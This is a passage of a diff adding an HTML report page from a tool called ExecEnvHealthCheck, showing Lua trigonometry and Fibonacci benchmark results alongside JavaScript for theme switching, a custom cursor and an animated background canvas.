+-- Time: 0.091s
+-- Speed: 5,513,351 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 500,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Heavy</td><td>1,000,000</td><td>0.183s</td><td class='td-ips'><span class='ips-val'>5,460,906/s</span><div class='ips-track'><div class='ips-fill' style='width:99%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p185',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p185'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Heavy
+-- Status: PASS
+-- Iterations: 1,000,000
+-- Time: 0.183s
+-- Speed: 5,460,906 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 1,000,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Very Heavy</td><td>10,000,000</td><td>1.895s</td><td class='td-ips'><span class='ips-val'>5,278,215/s</span><div class='ips-track'><div class='ips-fill' style='width:95%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p186',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p186'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Very Heavy
+-- Status: PASS
+-- Iterations: 10,000,000
+-- Time: 1.895s
+-- Speed: 5,278,215 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 10,000,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Extreme</td><td>50,000,000</td><td>9.351s</td><td class='td-ips'><span class='ips-val'>5,346,857/s</span><div class='ips-track'><div class='ips-fill' style='width:96%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p187',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p187'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Extreme
+-- Status: PASS
+-- Iterations: 50,000,000
+-- Time: 9.351s
+-- Speed: 5,346,857 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 50,000,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr></tbody>
+    </table>
+  </div>
+</section>
+
+<section class="sec" id="fibonacci">
+  <div class="sh">
+    <div class="sh-title">FIBONACCI</div>
+    <div class="sh-meta">BIG INTEGER BENCHMARK</div>
+  </div>
+  <div class="stat-grid">
+    <div class='stat-card stat-purple'><div class='stat-val'>F(10,000)</div><div class='stat-label'>TERM</div><div class='stat-bar'></div></div>    <div class='stat-card stat-purple'><div class='stat-val'>2,090</div><div class='stat-label'>DIGITS</div><div class='stat-bar'></div></div>    <div class='stat-card stat-purple'><div class='stat-val'>3.1811s</div><div class='stat-label'>TIME</div><div class='stat-bar'></div></div>  </div>
+</section>
+
+</main>
+
+<footer>
+  <span>ExecEnvHealthCheck v3.2 — 2026-03-28 04:18:55</span>
+  <span>Madium</span>
+</footer>
+
+<script>
+(function(){
+  var links = Array.from(document.querySelectorAll('#nav a'));
+  var secs  = Array.from(document.querySelectorAll('section.sec[id]'));
+  var obs = new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){
+        links.forEach(function(l){ l.classList.remove('active'); });
+        var l = document.querySelector('#nav a[href="#'+e.target.id+'"]');
+        if(l) l.classList.add('active');
+      }
+    });
+  }, { threshold: 0.25 });
+  secs.forEach(function(s){ obs.observe(s); });
+})();
+
+function toggleThemeOld(){
+  var html = document.documentElement;
+  var dark = html.getAttribute('data-theme') === 'dark';
+  html.setAttribute('data-theme', dark ? 'light' : 'dark');
+  document.getElementById('tbtn').textContent = dark ? 'DARK MODE' : 'LIGHT MODE';
+}
+
+function toggle(id, btn){
+  var row  = document.getElementById(id);
+  var open = row.classList.toggle('open');
+  btn.textContent = open ? 'HIDE DETAIL' : 'VIEW DETAIL';
+  btn.classList.toggle('open', open);
+}
+</script>
+
+<div id="cur"></div>
+
+<div id="cur-ring"></div>
+<canvas id="bg"></canvas>
+<div class="grid"></div>
+<div class="vig"></div>
+<script>
+  const THEME_COLORS = {
+    'classic': '0, 255, 65',
+    'pink': '255, 0, 255',
+    'cherry': '255, 77, 109',
+    'blue': '0, 240, 255',
+    'purple': '189, 147, 249',
+    'orange': '255, 170, 0',
+    'gold': '255, 215, 0',
+    'frost': '160, 240, 255',
+    'radioactive': '191, 255, 0',
+    'violet': '138, 43, 226',
+    'blood': '220, 20, 60',
+    'mono': '255, 255, 255'
+  };
+  let currentRGB = '0, 255, 65';
+  
+  (function(){
+    let s = localStorage.getItem('theme') || 'classic';
+    document.documentElement.setAttribute('data-theme', s);
+    currentRGB = THEME_COLORS[s] || '0, 255, 65';
+  })();
+
+  const cur = document.getElementById('cur');
+  const ring = document.getElementById('cur-ring');
+  let mx=-300, my=-300, rx=-300, ry=-300;
+  
+  document.addEventListener('mousemove', e => {
+    mx = e.clientX; my = e.clientY;
+    if(cur){ cur.style.left = mx+'px'; cur.style.top = my+'px'; }
+  });
+  
+  (function loop() {
+    rx += (mx-rx)*0.13; ry += (my-ry)*0.13;
+    if(ring){ ring.style.left = rx+'px'; ring.style.top = ry+'px'; }
+    requestAnimationFrame(loop);
+  })();
+  
+  document.querySelectorAll('a, button, .vbtn').forEach(el => {
+    el.addEventListener('mouseenter', () => { if(ring){ ring.style.width=ring.style.height='42px';} });
+    el.addEventListener('mouseleave', () => { if(ring){ ring.style.width=ring.style.height='24px';} });
+  });
+
+  const canvas = document.getElementById('bg');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    let W, H;
+    function resize() { W=canvas.width=innerWidth; H=canvas.height=innerHeight; }
+    resize(); window.addEventListener('resize', resize);
+    
+    const STARS = Array.from({length:180}, () => ({
+      x:Math.random(), y:Math.random(),
+      r:Math.random()*1+0.2,
+      base:Math.random()*0.4+0.07,
+      phase:Math.random()*Math.PI*2,
+      spd:Math.random()*0.02+0.006,
+    }));
+    
+    const NODES = Array.from({length:55}, () => ({
+      x:Math.random()*(innerWidth||1400),
+      y:Math.random()*(innerHeight||900),
+      vx:(Math.random()-.5)*.4,
+      vy:(Math.random()-.5)*.4,
+      r:Math.random()*1.4+0.4,
+    }));
+    
+    const CONN=150, CPULL=180, ATT=0.0012;
+    
+    (function draw() {
+      ctx.clearRect(0,0,W,H);
+      for (const s of STARS) {
+        s.phase+=s.spd;
+        ctx.beginPath();
+        ctx.arc(s.x*W, s.y*H, s.r, 0, Math.PI*2);
+        ctx.fillStyle=`rgba(${currentRGB},${s.base*(.5+.5*Math.sin(s.phase))})`;
+        ctx.fill();
+      }
+      for (const n of NODES) {
+        const dx=mx-n.x, dy=my-n.y, d=Math.hypot(dx,dy);
+        if (d<CPULL) { const f=ATT*(1-d/CPULL); n.vx+=dx*f; n.vy+=dy*f; }
+        n.vx*=.974; n.vy*=.974;
+        n.x+=n.vx; n.y+=n.vy;
+        if(n.x<0){n.x=0;n.vx*=-1;} if(n.x>W){n.x=W;n.vx*=-1;}
+        if(n.y<0){n.y=0;n.vy*=-1;} if(n.y>H){n.y=H;n.vy*=-1;}
+      }
+      for (let i=0;i<NODES.length;i++) {
+        for (let j=i+1;j<NODES.length;j++) {
+          const d=Math.hypot(NODES[i].x-NODES[j].x, NODES[i].y-NODES[j].y);
+          if(d<CONN){
+            ctx.beginPath(); ctx.moveTo(NODES[i].x,NODES[i].y); ctx.lineTo(NODES[j].x,NODES[j].y);
+            ctx.strokeStyle=`rgba(${currentRGB},${(1-d/CONN)*.14})`; ctx.lineWidth=.5; ctx.stroke();
+          }
+        }
+        const cd=Math.hypot(NODES[i].x-mx, NODES[i].y-my);
+        if(cd<CPULL){
+          const t=1-cd/CPULL;
+          ctx.beginPath(); ctx.moveTo(NODES[i].x,NODES[i].y); ctx.lineTo(mx,my);
+          ctx.strokeStyle=`rgba(${currentRGB},${t*.55})`; ctx.lineWidth=t*1.3; ctx.stroke();
+        }
+      }
+      for (const n of NODES) {
+        const cd=Math.hypot(n.x-mx, n.y-my), close=cd<CPULL, t=close?1-cd/CPULL:0;
+        ctx.beginPath(); ctx.arc(n.x,n.y,close?n.r*2:n.r,0,Math.PI*2);
+        ctx.fillStyle=`rgba(0,255,65,${close?.75:.25})`; ctx.fill();
+      }
+      requestAnimationFrame(draw);
+    })();
+  }
+</script>
+
+<script src="lang.js"></script>
+</body>
+</html>
